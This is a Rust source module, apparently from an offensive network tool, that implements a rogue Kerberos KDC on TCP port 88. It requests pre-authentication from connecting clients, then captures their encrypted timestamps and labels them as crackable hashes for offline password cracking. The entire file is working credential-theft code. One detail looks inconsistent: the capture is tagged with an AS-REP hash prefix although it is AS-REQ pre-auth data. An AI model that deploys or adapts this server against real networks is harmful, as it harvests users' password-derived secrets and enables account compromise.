//! Rogue Kerberos KDC (TCP 88). Observes AS-REQ, elicits pre-authentication and captures the
//! encrypted timestamp (crackable as a Kerberos AS-REQ pre-auth hash).

use std::sync::Arc;

use anyhow::Result;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};

use crate::capture::model::{CaptureArtifact, Protocol};
use crate::protocols::krb5;

use super::ServerContext;

pub async fn serve(listener: TcpListener, ctx: Arc<ServerContext>) -> Result<()> {
    loop {
        let (stream, peer) = listener.accept().await?;
        let ctx = ctx.clone();
        tokio::spawn(async move {
            let _ = handle(stream, peer, ctx).await;
        });
    }
}

async fn handle(
    mut stream: TcpStream,
    peer: std::net::SocketAddr,
    ctx: Arc<ServerContext>,
) -> Result<()> {
    loop {
        // Kerberos over TCP uses a 4-byte big-endian length prefix.
        let mut len_buf = [0u8; 4];
        if stream.read_exact(&mut len_buf).await.is_err() {
            break;
        }
        let len = u32::from_be_bytes(len_buf) as usize;
        if len == 0 || len > 1 << 20 {
            break;
        }
        let mut msg = vec![0u8; len];
        if stream.read_exact(&mut msg).await.is_err() {
            break;
        }

        if krb5::message_type(&msg) != Some(krb5::APP_AS_REQ) {
            continue;
        }
        let req = krb5::parse_as_req(&msg);
        let realm = req
            .realm
            .clone()
            .unwrap_or_else(|| "DOMAIN.LOCAL".to_string());
        let cname = req.cname.clone().unwrap_or_else(|| "user".to_string());

        let reply = if let Some(preauth) = &req.preauth {
            // Pre-authentication captured: record and refuse.
            let label = format!("$krb5asrep${}@{}", cname, realm.to_uppercase());
            ctx.sink.artifact(CaptureArtifact::raw(
                Protocol::Kerberos,
                peer.ip(),
                &label,
                preauth.clone(),
            ));
            krb5::build_error(krb5::KDC_ERR_ETYPE_NOSUPP, &realm, &cname, "krbtgt", false)
        } else {
            // No pre-auth yet: ask for it.
            krb5::build_error(
                krb5::KDC_ERR_PREAUTH_REQUIRED,
                &realm,
                &cname,
                "krbtgt",
                true,
            )
        };

        let mut out = (reply.len() as u32).to_be_bytes().to_vec();
        out.extend_from_slice(&reply);
        stream.write_all(&out).await?;
    }
    Ok(())
}
